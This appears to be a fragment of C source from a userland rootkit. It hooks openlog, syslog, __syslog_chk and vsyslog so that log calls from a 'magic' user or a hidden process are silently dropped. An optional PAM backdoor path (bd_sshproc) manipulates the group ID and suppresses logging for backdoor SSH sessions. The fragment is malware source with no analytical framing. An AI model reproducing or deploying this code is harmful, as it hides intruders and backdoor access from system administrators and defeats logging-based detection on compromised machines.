void openlog(const char *ident, int option, int facility){
    if(magicusr() || hidden_ppid()) return;
    hook(COPENLOG);
    call(COPENLOG, ident, option, facility);
    return;
}

void syslog(int priority, const char *format, ...){
    if(magicusr() || hidden_ppid()) return;

#ifdef USE_PAM_BD
    if(bd_sshproc()){
        hook(CSETGID);
        call(CSETGID, readgid());
        return;
    }
#endif

    va_list va;
    va_start(va, format);
    vsyslog(priority, format, va);
    va_end(va);
    return;
}

void __syslog_chk(int priority, int flag, const char *format, ...){
    if(magicusr() || hidden_ppid()) return;

#ifdef USE_PAM_BD
    if(bd_sshproc()){
        hook(CSETGID);
        call(CSETGID, readgid());
        return;
    }
#endif

    va_list va;
    va_start(va,format);
    vsyslog(priority,format,va);
    va_end(va);
    return;
}

void vsyslog(int priority, const char *format, va_list ap){
    if(magicusr() || hidden_ppid()) return;

#ifdef USE_PAM_BD
    if(bd_sshproc()){
        hook(CSETGID);
        call(CSETGID, readgid());
        return;
    }
#endif

    hook(CVSYSLOG);
    call(CVSYSLOG, priority, format, ap);
    return;
}
